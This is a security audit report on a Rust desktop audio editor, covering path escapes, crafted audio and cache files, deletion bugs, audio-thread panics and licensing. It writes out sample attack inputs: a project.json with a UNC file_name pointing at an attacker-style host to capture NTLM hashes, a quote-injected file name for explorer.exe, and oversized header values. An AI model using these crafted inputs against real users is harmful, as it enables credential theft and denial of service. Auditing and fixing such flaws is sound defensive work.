# Security audit - Audio Editor 0.1.0

| | |
|---|---|
| Date | 2026-10-27 |
| Commit | `bbed1b8` (branch `security-audit`, working tree clean at start) |
| Scope | All of `src/`, `Cargo.toml`/`Cargo.lock`, `build.rs`, `.cargo/config.toml`, `installer/`, `scripts/`, `THIRD-PARTY-NOTICES.txt`, the built `target/release/audio_editor.exe` and installer |
| Method | `cargo audit`, `cargo deny`, `cargo geiger`; full read of the source; throwaway proof-of-concept harness that compiles the app's **real** source files (`io/resample.rs`, `io/decode.rs`, `io/peaks.rs`, `io/paths.rs`, `audio/resampler.rs`, `util/time.rs`, `model/media.rs`) into a scratch crate outside the repo; 64,000-case mutation fuzz of `decode_file` |
| Repo changes | None except this file. Every scratch artifact lives outside the repo. |

Evidence tags used below: **[V]** = reproduced by running the app's real code; **[S]** = static review only (not run).

## Threat model and severity rubric

Single-user Windows desktop app. The attacker controls a file the user opens: a **project folder** (`project.json`, `autosave/*.json`, `cache/*.peaks`, `cache/*.f32.wav`, `media/*`), a **WAV/MP3** the user imports or relinks, or the user's own `%APPDATA%\AudioEditor\config\recent.json`. The app has no network code, so there is no remote attacker.

| Severity | Meaning |
|---|---|
| Critical | Code execution or privilege escalation from a crafted file |
| High | A crafted file/folder, opened or imported in normal use, discloses credentials or damages data outside the project |
| Medium | Hard crash, hang, resource exhaustion or data loss from crafted input, or a violated stated invariant (audio-thread no-panic) |
| Low | Hardening, edge cases, user-initiated mistakes, compliance details |
| Info | Observations |

## Summary

No Critical finding. No `unsafe` in first-party code, no `unwrap`/`expect` outside tests and `main.rs`, and 64,000 mutated WAV/MP3 files produced no panic or hang in a release build. The real problems are all the same shape: **data read from disk is trusted** (project.json, autosave, peaks cache, WAV header fields) and reaches path joins, divisions, allocations and loops unchecked. One validation pass on load plus three reader fixes (AE-01 to AE-04) removes most of the risk.

Fix first: **AE-01** (UNC/absolute `file_name` leaks NTLM credentials when a project opens), then **AE-03** (validate on load), **AE-02** and **AE-04** (crafted audio/cache files that hang or abort the process), **AE-05** (Save silently recycles files).

| ID | Severity | Area | File:line | Title |
|---|---|---|---|---|
| AE-01 | **High** | b Path | `src/io/import.rs:168`, `src/editor/editor.rs:1428`, `src/io/paths.rs:210` | `MediaItem.file_name` is joined onto `media/` unchecked: UNC/absolute/`..` paths escape the project and open triggers network auth |
| AE-02 | Medium | a Parse | `src/io/resample.rs:52-74`, `src/io/decode.rs:68,82-104` | A 244-byte WAV labelled 1 Hz makes `resample()` expand 48,000x (hang, then out-of-memory abort) |
| AE-03 | Medium | a/f Parse | `src/io/project_file.rs:60`, `src/io/autosave.rs:64`, `src/model/clip.rs:30`, `src/util/time.rs:6` | project.json and autosave are never validated on load: divide-by-zero crash, UI hang, disk-filling export, unbounded gain |
| AE-04 | Medium | a Parse | `src/io/peaks.rs:148-150`, `src/ui/timeline/waveform.rs:48-51` | A 34-byte `.peaks` file aborts the process; `block_size = 0` panics the UI thread |
| AE-05 | Medium | c Delete | `src/io/paths.rs:140-151,161`, `src/editor/editor.rs:316-325` | Save recycles media still in use (case-sensitive name match) and follows a `media/` junction out of the project |
| AE-06 | Medium | e Audio | `src/audio/resampler.rs:47-52,72`, `src/audio/engine.rs:117-121` | Audio callback panics when project rate / device rate is above 4 |
| AE-07 | Medium | c Overwrite | `src/io/project_file.rs:73-101`, `src/ui/dialogs/save_as.rs:62,110` | Save As into the project's own folder recurses without end; autosave deleted before the copy |
| AE-08 | Medium | f Panic | `src/editor/jobs.rs:117,136,155,181`, `src/editor/editor.rs:1311-1372` | A panic in a worker thread leaves jobs "pending" forever; an export panic locks the editor and blocks close |
| AE-09 | Medium | h License | `THIRD-PARTY-NOTICES.txt:14-16,166-167,370`, `installer/audio_editor.iss:38-40`, `Cargo.toml:18` | LGPL LAME statically linked; notices lack license texts, misstate LAME's license, ship incomplete |
| AE-10 | Low | a Parse | `Cargo.toml:23`, `src/io/decode.rs:43,134` | symphonia default features link FLAC/Ogg/MKV/Vorbis/ADPCM readers; only the file extension is checked |
| AE-11 | Low | d Process | `src/io/paths.rs:207-212`, `src/editor/editor.rs:1426-1428` | `reveal_in_explorer`: a `"` in the path breaks out of the `/select,` argument |
| AE-12 | Low | c Write | `src/io/project_file.rs:37-38`, `src/io/autosave.rs:38-39`, `src/io/recent.rs:72-73`, `src/io/peaks.rs:94-95`, `src/io/wav.rs:36`, `src/io/export.rs:114` | tmp+rename writes never `fsync`; fixed temp names; stale `.tmp` files never cleaned |
| AE-13 | Low | f Resource | `src/editor/editor.rs:1204-1215,1382-1388`, `src/app.rs:424-432` | One OS thread per media item / dropped file, unbounded |
| AE-14 | Info | g Installer | `installer/audio_editor.iss:50-52` | Post-install launch is non-elevated by default; only an installer started "as administrator" launches the app elevated |
| AE-15 | Low | g Build | `.cargo/config.toml:3`, `Cargo.toml:32-35`, `installer/audio_editor.iss` | Unsigned exe and installer; no CFG/CET; exe embeds build-machine paths |
| AE-16 | Low | f Arith | `src/model/clip.rs:29-35`, `src/editor/editor.rs:365`, `src/audio/mixer.rs:34,97,103,110,113` | Unchecked u64 arithmetic relies on release-mode wrapping |
| AE-17 | Low | c Overwrite | `src/io/paths.rs:74-99`, `src/io/import.rs:98-100` | `unique_media_name` check then `fs::copy` can overwrite a concurrent import |
| AE-18 | Low | b Path | `src/io/paths.rs:47-55`, `src/editor/editor.rs:1602-1610` | Project-name validation is incomplete; the default export path is built from the unvalidated name in project.json |
| AE-19 | Low | g Deps | `Cargo.lock` (`clipboard-win 5.4.1`), `Cargo.toml` | Yanked crate in the Windows graph; LAME (C) is invisible to `cargo audit`; no `deny.toml` |
| AE-20 | Info | g Build | `scripts/build-installer.ps1:29-38,44`, `scripts/gen_notices.py:17-18`, `__pycache__/` | Build-script hygiene; stray tracked `.pyc` |
| AE-21 | Info | - | `src/ui/dialogs/new_project.rs:86-91,148` | Not security: "44 kHz" and "88 kHz" create 44,000 Hz and 88,000 Hz projects |
| AE-22 | Info | f Perf | `src/ui/timeline/waveform.rs:286`, `src/editor/editor.rs:736` | O(clip length) loops on the UI thread |

---

## Findings

### AE-01 High - `MediaItem.file_name` escapes the media folder (UNC credential leak on open)

**What is wrong.** `file_name` comes straight from project.json and is joined onto `media/` with `Path::join`. `join` *replaces* the base when the argument is absolute or UNC, and `..` is not blocked. `load_or_rebuild` does `paths.media().join(&item.file_name)` then `is_file()` then `decode_file` (`src/io/import.rs:168,169,192`). `reveal_media` does the same join (`src/editor/editor.rs:1428`).

**How to trigger.** [V for the join; S for the network behavior] A project whose `media[0].file_name` is `\\203.0.113.7\share\a.wav`:

```json
{"format_version":1,"project":{"name":"x","sample_rate":48000,"export_bit_depth":"Int24","master_volume_db":0.0,
 "media":[{"id":"6f1d4a52-0b0e-4c53-9a43-2b1a6c1d9e11","display_name":"a","file_name":"\\\\203.0.113.7\\share\\a.wav",
 "original_rate":48000,"channels":2,"length":48000}],"tracks":[],"markers":[]},"view":{}}
```

Opening the project starts a load job per media item immediately (`src/editor/editor.rs:1378-1388`), so `is_file()` runs against the UNC path with no further click. Windows then connects to that host and authenticates with the user's NTLM credentials (SMB, or WebDAV if the WebClient service is running), which hands a NetNTLMv2 hash to whoever runs the server. Needs outbound SMB/HTTP to be reachable; not exercised against a live listener. The harness confirmed `media.join("\\\\attacker.example\\share\\x.wav")` returns exactly that UNC path, and `join("C:\\Windows\\win.ini")` returns the absolute path with `is_file() == true`. An absolute local path also lets a crafted project make the app decode any WAV/MP3 elsewhere on disk and write a cache copy of it.

**Fix.** On load, require `file_name` to be exactly one `Component::Normal` (no separators, no drive/UNC prefix, no `..`, no `:`) and reject the project otherwise; re-assert the same rule inside `load_or_rebuild` and `reveal_media` as defence in depth.

### AE-02 Medium - Tiny WAV with a low sample rate: 48,000x resample expansion

**What is wrong.** The decoder trusts the header sample rate (`src/io/decode.rs:68`) and `resample()` sizes its buffers from `to / from` with no bound: `target = frames * to / from` (`src/io/resample.rs:52-53`), and `out` is allocated up front as `target + delay + flush_frames + ...` where `flush_frames = CHUNK_FRAMES * to / from` (`:71-74`), then a second `target`-sized `result` (`:107`). With `from = 1` and `to = 48000` that is 49 million frames per channel allocated for *any* input, however short.

**How to trigger.** [V] Import (button, drag-and-drop or Relink) a PCM WAV whose header says 1 Hz. The real `decode_file` + `resample()` turned a 244-byte file (100 frames) into 4,800,000 frames (48,000x) and took 2.9 s of CPU in a release build (minutes in debug). Extrapolated from that measurement (not run, to avoid exhausting memory): each 1,024-frame input chunk yields about 49 million output frames, so 10,000 frames (20 KB file) means about 490 million output frames, roughly 30 s of CPU and about 4 GB of RAM (`out` plus `result`); 500,000 frames (1 MB file) asks for about 96 GB in `result` alone, which fails and aborts the whole process (the same `memory allocation ... failed` abort the peaks PoC shows in AE-04). The same path runs when a project is opened with its cache missing (`load_or_rebuild` slow path, `src/io/import.rs:192-199`). MP3 is not affected (rates are fixed at 8-48 kHz). The 64,000-case fuzz did not touch this because it only changed bytes, not the semantic header value.

Related: nothing caps decoded size. Samples grow in one `Vec` (`src/io/decode.rs:82-104`), then a resampled copy, a conformed WAV and peaks are built, so memory is roughly 3-4x the decoded size per item, and all items load at once (AE-13). A 128 kbps stereo MP3 expands about 22x when decoded to f32.

**Fix.** Reject files whose rate is outside a sane window (for example 8,000 to 768,000 Hz) and files whose decoded or resampled length exceeds a hard cap; stream the resample in chunks (the repo already has `StreamResampler`) instead of preallocating `target + flush_frames`.

### AE-03 Medium - project.json and autosave are never validated on load

**What is wrong.** `model::invariants::check` runs only after edits (`src/editor/editor.rs:853,963`). `project_file::load` and `autosave::load` deserialize and return (`src/io/project_file.rs:60-67`, `src/io/autosave.rs:64-71`), so every field is attacker-controlled. Consequences found:

1. **`sample_rate: 0` crashes the UI** with integer divide-by-zero at `src/util/time.rs:6`, `src/ui/bin_panel.rs:595`, `src/ui/timeline/ruler.rs:423` and `:521`. [V: `samples_to_timecode(1, 0)` panics with "attempt to divide by zero"; integer division is checked in release too.] It repeats on every open, so the project cannot be opened again.
2. **`src_out < src_in` wraps `Clip::len()`** (`src/model/clip.rs:30`) to about 2^64. Normalize then loops `for local in 0..len` on the UI thread (`src/editor/editor.rs:736`): a hang. [S]
3. **Huge `src_out`/`start`** makes `project_length()` (`src/editor/editor.rs:365`) enormous; a whole-project export then renders and writes silence until the disk is full (`src/editor/jobs.rs:240-265` has no size limit). [S]
4. **Levels are not range-checked on load** (`volume_db`, `gain_db`, `master_volume_db`, `pan`). `db_to_linear` has no clamp (`src/util/db.rs:4`) and the audio callback has no limiter or NaN guard (`src/audio/engine.rs:289-324`), so `master_volume_db: 400` plays as full-scale garbage at the user's volume setting. [S]
5. `sample_rate` also reaches the audio engine (AE-06). `Track.height`, `Marker.position` and the media count are unchecked too.

**How to trigger.** Hand-edit project.json (or the autosave: an `autosave/project.autosave.json` newer than project.json raises the "Recover autosave" prompt, and Recover loads it).

**Fix.** Add one `validate_loaded(&Project, &ViewState)` called by both loaders: run `invariants::check`, require `sample_rate` in a supported set, `channels` in 1..=2, finite in-range floats, a bounded media/track/clip count, and the AE-01 file-name rule; make `Clip::len` use `saturating_sub`.

### AE-04 Medium - Crafted `.peaks` cache file aborts or panics the app

**What is wrong.** `peaks::read` allocates `Vec::with_capacity(blocks as usize * channels)` straight from a u64 in the file (`src/io/peaks.rs:148-150`), before checking that many bytes exist. Separately `level_minmax` divides by the file's `block_size` (`src/ui/timeline/waveform.rs:48-51`), which can be 0.

**How to trigger.** [V for `read`] A 34-byte file `PEAK`, version 1, channels 1, frames 0, one level, block_size 256, block count `2^40`. The real `peaks::read` died with `memory allocation of 8796093022208 bytes failed` (process abort, not a catchable panic); block count `2^62` gives `capacity overflow` (panic). Put it at `cache/<media-uuid>.peaks` next to a matching `<uuid>.f32.wav` in a project folder; `load_or_rebuild` takes the fast path (`src/io/import.rs:177-182`) and reads it on every open, so the project crash-loops until `cache/` is cleaned by hand. `block_size = 0` reaches `from / bs` in `level_minmax` when the clip is drawn [S, same divide-by-zero as AE-03].

**Fix.** Bound `blocks * channels * 8` by the bytes remaining before allocating, reject `block_size == 0` and `channels > 2`, and treat any peaks error as "rebuild from media" (it already falls back for a bad WAV).

### AE-05 Medium - Save recycles media still in use, and follows a junction out of the project

**What is wrong.** After every Save, `cleanup_unused` moves every regular file in `media/` that is not in the project's `file_name` set to the Recycle Bin (`src/io/paths.rs:140-155`, called from `src/editor/editor.rs:316-325`). The comparison is a case-sensitive `HashSet<String>` lookup (`:151`), but NTFS is case-insensitive, and `read_dir` follows a `media/` or `cache/` directory junction (`:140,161`).

**How to trigger.** [V, real `cleanup_unused` with `recycle=false` on throwaway folders]
- Import `boom.wav`, rename it `BOOM.wav` in Explorer (still loads, so no offline warning), Save: `media/boom.wav` is removed although clips use it (`"Removed unused file: boom.wav"`). The same happens when project.json is edited or migrated with different case.
- Make `<project>\media` a junction to another folder (`New-Item -ItemType Junction`), Save: every regular file in the target folder is removed (2 of 2 files in the test). With `recycle=true` (production) they go to the Recycle Bin, so this is recoverable but unprompted. Ordinary zip extraction on Windows does not create junctions, so this needs a link already on the machine (or an archive tool that restores links).

It also recycles any file the user drops into `media/` by hand. `trash::delete` passes `FOF_NO_UI | FOF_ALLOWUNDO | FOF_WANTNUKEWARNING`, so un-recyclable files should fail rather than be deleted; not tested with a file larger than the bin.

**Fix.** Compare names case-insensitively, skip cleanup when `media/` or `cache/` is a reparse point or resolves outside the root, and prefer removing only files the app created (or ask once before the first cleanup).

### AE-06 Medium - Audio callback panics when project rate / device rate exceeds 4

**What is wrong.** `DeviceResampler::fill` computes `drop = (low - base).max(0) as usize` then `self.len -= drop` (`src/audio/resampler.rs:47-52`). When one output frame advances more than about 4 project frames, `drop` exceeds `len`; release builds wrap `len` to near `usize::MAX` and the next `pull(&mut self.buf[self.len*2..])` panics (`:72`). Debug builds panic at `:51` ("attempt to subtract with overflow"). This breaks the stated rule "no panics on the audio thread".

**How to trigger.** [V, real `DeviceResampler`] ratio 2.0 and 4.0 run fine; ratio 8.0 (384 kHz on a 48 kHz device) and 20.8 (1 MHz) panic on the second callback in both debug and release (`range start index 18446744073709551608 out of range for slice of length 32784`). The UI offers at most 96 kHz (`src/ui/dialogs/new_project.rs:86-91`), so normal use needs a device at 22.05 kHz or below; a crafted `sample_rate` in project.json triggers it on any device whose mix rate differs (`Engine::start` uses the file's rate, `src/audio/engine.rs:88-121`). What cpal does after a callback panic was not tested.

**Fix.** `let drop = drop.min(self.len);` (and clamp `sample_rate` on load per AE-03); optionally wrap the callback body in `catch_unwind` that outputs silence.

### AE-07 Medium - Save As into the project's own folder never terminates

**What is wrong.** `copy_project` creates `parent/new_name` then `copy_tree(&from.root, &target_root)` (`src/io/project_file.rs:73-101`). If the destination is inside the source, the copy discovers the folder it is creating and descends into it forever. The dialog does not check (`src/ui/dialogs/save_as.rs:62,110`). `is_dir()` also follows junction/symlink cycles.

**How to trigger.** [V, `copy_tree` copied verbatim with a depth cap] Save As, Browse the parent folder to `<project>\media` (or the project root), Save. Nesting `Proj\media\Copy\media\Copy\media\...` reached the demo's cap of 12 levels; the app has no cap, so it runs until the path-length limit, the disk or the stack is exhausted (not run to that point). Also, `save_as` deletes the old folder's autosave before copying (`src/editor/editor.rs:280-281`), so a failed copy loses the only recovery file for unsaved work.

**Fix.** Refuse a destination that is inside the source (or the reverse) after canonicalizing both, skip reparse points in `copy_tree`, and delete the old autosave only after the copy and save succeed.

### AE-08 Medium - Worker-thread panic leaves the editor stuck

**What is wrong.** Import, relink, load and export run in bare `thread::spawn` closures with no `catch_unwind` or drop guard (`src/editor/jobs.rs:117,136,155,181`). If one panics, its `...Done` message is never sent, so `pending` keeps the job forever (`src/editor/editor.rs:1311-1372`). For export, `exporting` stays `Some`: every edit returns "Export in progress", and the close prompt loops waiting for the export to unlock.

**How to trigger.** Any panic inside symphonia, rubato, the mixer or the sinks. AE-04 (`capacity overflow`) is a reproducible panic that reaches a load thread. [S for the stuck state]

**Fix.** Wrap each job body in `catch_unwind` and always send a failure `...Done`, or hold a guard whose `Drop` does so.

### AE-09 Medium - Licensing: LGPL LAME and the notices file

**What is wrong.**
1. LAME is compiled from the vendored LAME 3.100 source (`mp3lame-sys`) and **statically linked into the single exe**. LAME is LGPL-2.0-or-later (its `COPYING` is the GNU Library GPL v2); the Rust wrappers `mp3lame-encoder`/`mp3lame-sys` declare LGPL-3.0. Shipping only the exe does not by itself satisfy the LGPL requirement that users can relink the work against a modified LAME.
2. `THIRD-PARTY-NOTICES.txt` says "LAME ... LGPL-3.0" (`:14-16`) - inaccurate for LAME itself - and only links the license URL. It contains identifiers, not the license texts or copyright lines that MIT, BSD, Apache-2.0, MPL-2.0 (symphonia, 13 crates), LGPL and OFL/Ubuntu-font (`epaint_default_fonts`) expect to travel with binaries.
3. Three entries are `UNKNOWN`: `iana-time-zone 0.1.65`, `iana-time-zone-haiku 0.1.2`, `urlencoding 2.1.3` (`:166-167,370`). `scripts/gen_notices.py:90` writes UNKNOWN when a crate was never downloaded; `cargo deny list` resolves all three as MIT (and Apache-2.0 for the two `iana-time-zone` crates).
4. The installer ships only the exe, `README.md` and the notices file (`installer/audio_editor.iss:38-40`). The notices point at `assets/fonts/LICENSE-IBMPlex.txt` and `OFL-JetBrainsMono.txt`, which are not installed, although the fonts are embedded in the exe.

**Fix.** Either publish the app source (or an object-file relink kit) alongside releases, or move MP3 export behind a separately shipped LAME DLL; correct the LAME entry and generate full license texts (for example `cargo about`) into the installed notices file, including the font license files; fill in the three UNKNOWN crates.

### AE-10 Low - symphonia default features enlarge the parser attack surface

**What is wrong.** `symphonia = { version = "0.6.1", features = ["wav","mp3","pcm"] }` leaves default features on, which add `adpcm`, `flac`, `mkv`, `ogg`, `vorbis`, `all-meta` and `opt-simd` (`Cargo.toml:23`). [V: `cargo tree -p symphonia -e features` and `cargo geiger` list the flac, ogg, mkv, vorbis and adpcm crates as linked.] `is_supported` checks only the extension (`src/io/decode.rs:134-139`) and `get_probe()` detects by content (`:43`), so a file named `x.wav` can be an MKV, Ogg or FLAC and would be parsed by those readers and copied into `media/` under the `.wav` name (S: no renamed FLAC/Ogg/MKV sample was decoded in this audit). All symphonia crates forbid `unsafe`, so the risk is panics and allocation bombs rather than memory corruption, and the 64,000-case fuzz found none, but the surface is unneeded.

**Fix.** Use `default-features = false, features = ["wav","mp3","pcm","id3v2"]` (test with an ID3-tagged MP3) and verify the decoded format matches the extension.

### AE-11 Low - Argument injection in `reveal_in_explorer`

**What is wrong.** The path is placed inside `/select,"..."` through `raw_arg` (`src/io/paths.rs:207-212`). Windows file names cannot contain `"`, but `file_name` from project.json can (AE-01), so a quote closes the argument and the rest is parsed as more `explorer.exe` arguments. The program is looked up as bare `explorer.exe`.

**How to trigger.** [V] Right-click a bin item, "Reveal in Explorer", with `file_name = boom.wav" "C:\Windows\System32\notepad.exe`. The command line became `/select,"...\boom.wav" "C:\Windows\System32\notepad.exe"`. On this machine (Windows 11, build 10.0.26200) Notepad was **not** launched, so impact is limited to what Explorer opens or selects (including a UNC path); other Explorer builds were not tested.

**Fix.** Fix AE-01, additionally reject any path containing `"`, and call `%SystemRoot%\explorer.exe` by absolute path.

### AE-12 Low - Atomic writes are not durable

**What is wrong.** project.json, autosave, recent.json, peaks, conformed WAVs and exports are written to a temp file then renamed, with no `File::sync_all` before the rename (`src/io/project_file.rs:37-38`, `src/io/autosave.rs:38-39`, `src/io/recent.rs:72-73`, `src/io/peaks.rs:94-95`, `src/io/wav.rs:36`, `src/io/export.rs:114`). After a power loss or crash the rename can survive while the data does not, leaving an empty `project.json`. Temp names are fixed and predictable (`project.json.tmp`), `fs::write` follows links at that name, and leftover `.tmp` and `.part` files are never cleaned (`cleanup_cache` ignores them).

**How to trigger.** Power-cut or kill the machine right after Save. [S]

**Fix.** Write, `sync_all`, then rename (or use `MoveFileExW` with `MOVEFILE_WRITE_THROUGH`); keep the previous project.json as `project.json.bak`.

### AE-13 Low - Unbounded thread-per-item concurrency

**What is wrong.** `start_media_loads` spawns one OS thread per media item (`src/editor/editor.rs:1382-1388`); dropping files spawns one per file (`:1204-1215`, `src/app.rs:424-432`). Each thread decodes a whole file into RAM. `thread::spawn` panics if the OS refuses a thread, on the UI thread here.

**How to trigger.** A project.json with thousands of `media` entries, or dropping hundreds of files. [S]

**Fix.** Use a small worker pool (2-4 threads) with a queue, and cap the media count on load.

### AE-14 Info - Post-install launch and elevation

I first suspected the `[Run]` entry (`installer/audio_editor.iss:50-52`, `Flags: nowait postinstall skipifsilent`) would start the app elevated after an all-users install. The Inno Setup 6 help installed on this machine says otherwise: `runasoriginaluser` "is the default behavior when the postinstall flag is used", so the launch checkbox starts the app with the pre-UAC credentials. The one remaining case is an installer started via "Run as administrator" or from an elevated process, where Inno documents that it cannot drop back to the original user. Nothing to fix; adding `runasoriginaluser` explicitly is harmless documentation.

### AE-15 Low - No code signing, partial binary hardening, build paths in the exe

**What is wrong.** [V] `Get-AuthenticodeSignature` reports `NotSigned` for both `audio_editor.exe` and the installer; the `.iss` has no `SignTool`. `dumpbin` shows ASLR (dynamic base, high-entropy VA) and NX on (DLL characteristics `0x8160`), but Control Flow Guard not enabled (no `GUARD_CF` bit, guard function count 0) and no CET-compatibility flag. The release exe contains 806 occurrences of the build user's profile path (805 cargo registry source paths from panic strings, plus the `audio_editor.pdb` path).

**Fix.** Sign exe and installer; add `-C control-flow-guard` and `/CETCOMPAT` link args, `strip = "symbols"` and `--remap-path-prefix` for release builds.

### AE-16 Low - Overflow behavior depends on release-mode wrapping

**What is wrong.** `Clip::len`/`end` (`src/model/clip.rs:29-35`), `project_length` (`src/editor/editor.rs:365`) and the mixer (`src/audio/mixer.rs:34,97,103,110,113`) use plain `-`, `+`, `*` on u64 values that come from the file. Release builds wrap silently; debug builds panic, on the audio thread for the mixer lines. The mixer stays in bounds after a wrap because every sample read goes through `.get()`, but enabling `overflow-checks` in `[profile.release]` would turn each of these into a panic.

**How to trigger.** A clip with `start` near `u64::MAX`, or `src_out < src_in`, then Play (debug build) or Normalize (AE-03). [S]

**Fix.** Use `saturating_*`/`checked_*` in those spots and validate on load.

### AE-17 Low - Import name race can overwrite media

**What is wrong.** `unique_media_name` tests `exists()` (`src/io/paths.rs:74-99`) and `import_core` later calls `fs::copy`, which overwrites (`src/io/import.rs:98-100`). Two concurrent import threads for same-named files from different folders can pick the same name; the second copy overwrites the first and both bin items point at one file.

**How to trigger.** Drop `a\boom.wav` and `b\boom.wav` together. Narrow timing window. [S]

**Fix.** Create the file with `OpenOptions::create_new(true)` in a retry loop.

### AE-18 Low - Project-name validation incomplete; default export path trusts project.json

**What is wrong.** `validate_project_name` rejects `<>:"/\|?*` and empty names only (`src/io/paths.rs:47-55`): not reserved device names (`CON`, `NUL`, `COM1`), trailing dots or spaces, or control characters. The name stored in project.json is never validated at all, and `default_export_path` builds `exports/<name>.wav` from it (`src/editor/editor.rs:1602-1610`), so a name like `..\..\Documents\x` pre-fills an export path outside `exports/`. The extension is forced to `.wav`/`.mp3` and an existing file triggers the overwrite prompt, so the damage is limited.

**Fix.** Sanitize the name on load and use only its file-name component; extend the validator with reserved names and trailing `.`/space.

### AE-19 Low - Dependency hygiene

- `cargo audit`: 0 vulnerabilities, 6 warnings. **Only one is in the Windows build:** `clipboard-win 5.4.1` is **yanked** (via `arboard` <- `egui-winit` <- `eframe`); `cargo update -p clipboard-win` moves to 5.4.3 (dry-run confirmed). The other five (`ttf-parser`, `zbus_names`, `zvariant`, `zvariant_derive` unmaintained; `tokio` unsound) do not appear in `cargo tree --target x86_64-pc-windows-msvc`.
- LAME is C code: `cargo audit` and `cargo geiger` do not see it. Track LAME advisories by hand (the app only encodes its own sanitized float output, so exposure is low).
- No `deny.toml`/CI gate exists, and `audio_editor` has no `license` field (`cargo deny` reports "Unlicensed").

**Fix.** Update `clipboard-win`; add a committed `deny.toml` (allow-list below) and run `cargo audit`/`cargo deny` in CI.

### AE-20 Info - Build and script hygiene

- `scripts/build-installer.ps1:29-38` runs the first `ISCC.exe` it finds, including under user-writable `%LOCALAPPDATA%\Programs`, without checking its signature.
- `:44` passes `"/DRoot=$root\"`; a repo path containing spaces may break argument parsing on the trailing backslash (not tested; the current path has no spaces).
- `scripts/gen_notices.py:17-18` hard-codes the cargo registry hash directory.
- `__pycache__/_sub_common.cpython-311.pyc` is tracked (committed in `3b877ca`) although `.gitignore:2-3` lists it; it embeds a local path.
- `build.rs` is clean: no network, spawns nothing itself (winresource runs `rc.exe`), `panic!` only at build time.

### AE-21 Info - "44 kHz" creates a 44,000 Hz project (not security)

`new_project.rs:148` computes `sample_rate_khz * 1000`, and the options are `44, 48, 88, 96` (`:86-91`), so "44 kHz" and "88 kHz" yield 44,000 and 88,000 Hz. MP3 export then maps both to 48 kHz (`mp3_rate`). Probably meant 44,100 / 88,200.

### AE-22 Info - Long loops on the UI thread

`waveform::draw_samples` iterates the whole clip source range every frame when zoomed in (`src/ui/timeline/waveform.rs:286`), and `measure_peak` loops per sample (`src/editor/editor.rs:736`). Janky on hour-long clips; not a security issue by itself.

---

## Required checks, mapped

### a. Untrusted input parsing

| Input | Reader | Result |
|---|---|---|
| WAV/MP3 | `io/decode.rs` (symphonia 0.6.1) | 64,000 mutated files (release): 0 panics, 0 hangs, 0 aborts. Header value abuse is not covered by byte mutation: AE-02. In a debug build 18 of 8,000 mutants panicked with "attempt to multiply with overflow" at `symphonia-format-riff-0.6.1/src/wave/chunks.rs:100`, a log-only computation that wraps harmlessly in release. |
| project.json / autosave | `serde_json` + serde derive | Depth limit (128) prevents stack overflow; types are strict (`Uuid`, enums). No semantic validation: AE-03. |
| `.peaks` | `io/peaks.rs` | Magic, version, truncation and trailing bytes are checked; length fields are not: AE-04. |
| `recent.json` | `io/recent.rs:56-62` | Bad JSON gives an empty list, no panic. Timestamps go through `timestamp_opt(..).single()?` (`start_screen.rs:838`). Low trust, low impact. `read_to_string` is unbounded (own config file). |
| Conformed WAV | `io/wav.rs:48-67` | hound validates; size bounded by file size. |

### b. Path handling (every place a path is built)

| Operation | Path source | Verdict |
|---|---|---|
| Load media | `media/` + `file_name` from project.json (`import.rs:168`) | **Unsafe: AE-01** |
| Reveal in Explorer | same join (`editor.rs:1428`) | **Unsafe: AE-01, AE-11** |
| Relink | user-picked file copied under its own OS file name; cache names from a typed `Uuid`; failure cleanup deletes the new copy (`editor.rs:1269`, new name from the job) | Safe |
| Import | OS file name, `unique_media_name` | Safe from traversal; race: AE-17 |
| `cleanup_unused` | names from `read_dir`, cache names must parse as `<uuid>.f32.wav`/`.peaks` | Cannot be steered by project.json; follows junctions: AE-05 |
| Save As copy | user-typed validated name + picked parent | Self-recursion: AE-07 |
| Autosave discard/delete | fixed names under `<root>/autosave/` | Safe (links aside) |
| Export | user-typed path, extension forced, overwrite prompt (`export.rs:291-295`) or native dialog | Safe; default prefill from project name: AE-18 |
| Drag-and-drop open | accepts only a folder containing `project.json` or a file named `project.json` (`start_screen.rs:630-635`) | Safe |
| Drag-and-drop import | any dropped path with a `.wav`/`.mp3` extension | Safe; thread bomb: AE-13 |

### c. Deletion and overwrite

Every delete/overwrite call (from a scan of non-test code):
- `trash::delete` only in `cleanup_media` (`paths.rs:195`); everything else is `fs::remove_file` on app-built names: `paths.rs:197` (cache), `import.rs:62-63,103-105` (cache and the fresh copy), `editor.rs:1269-1271`, `autosave.rs:83,93`, `export.rs:124` (`.part`), `wav.rs:41` (`.tmp`).
- `.part` handling is sound: `PartGuard` deletes the `.part` on drop/abort/error unless `commit` ran, sinks declare the file handle before the guard so the handle closes first, `cleanup_media` skips `*.part`, and a sink rejects partial frames.
- Overwrite semantics: `fs::rename` replaces the target on Windows; the user is asked once (native dialog or the app's own).
- Problems: AE-05, AE-07, AE-12, AE-17.

### d. Process launching

`explorer.exe` in `reveal_in_explorer` is the **only** place the app starts a process (grep for `Command::`/`process::`). Findings: AE-11. No shell, no `cmd /c`, no ShellExecute, no URL opening, no network code in `src/`.

### e. unsafe, FFI, audio thread

- First-party `unsafe`: **none**. [V `cargo geiger`: `audio_editor` 0/0 functions, 0/660 expressions, 0/5 impls, 0/165 methods.] There is no `#![forbid(unsafe_code)]`; adding it would lock this in.
- LAME FFI is confined to `mp3lame-encoder`/`mp3lame-sys` (323 unsafe expressions in the wrapper). The app's use is correct: output buffers are reserved with `max_required_buffer_size` before each `encode_to_vec`/`flush_to_vec` (`mp3.rs:98-100,116-120`), the tag buffer uses `lame_tag_size()`, input is clamped to +/-1 and NaN/inf become 0 (`mp3.rs:88-97`), channel count is validated 1..=2 (`export.rs:59-64`). The vendored LAME 3.100 builds with `cc` and no network access.
- Audio thread (`Callback::run`): no allocation, locks or I/O; scratch preallocated; `ArcSwap` + bounded crossbeam queue; retired plans are held 2 s so the callback never frees a plan. Violations of "no panics": AE-06 (verified), AE-16 (debug builds only).

### f. Panics and arithmetic

- `unwrap`/`expect`/`panic!`/`unreachable!` outside tests: only `main.rs:41` (`expect` on the embedded icon PNG) and `io/decode.rs:61` (`unreachable!` for a branch selected by the identical predicate two lines earlier). Clean.
- Reachable panics from untrusted data: AE-03 (divide by zero), AE-04 (`capacity overflow`, divide by zero), AE-06 (slice index), AE-08 (consequence).
- Float-to-int casts are saturating in Rust; sample conversions clamp first (`wav.rs:140,149`).
- Division by zero: `util/time.rs:6`, `bin_panel.rs:595`, `ruler.rs:423,521`, `waveform.rs:50-51` (all above). `resample.rs`/`StreamResampler` reject zero channels and rates.
- Unchecked u64 math: AE-16.

### g. Build and distribution

- `build.rs`: fine (AE-20).
- `.cargo/config.toml`: `crt-static` for the MSVC target; [V] `dumpbin /dependents` shows only system DLLs (no VCRUNTIME/api-ms-win-crt). Hardening gaps: AE-15.
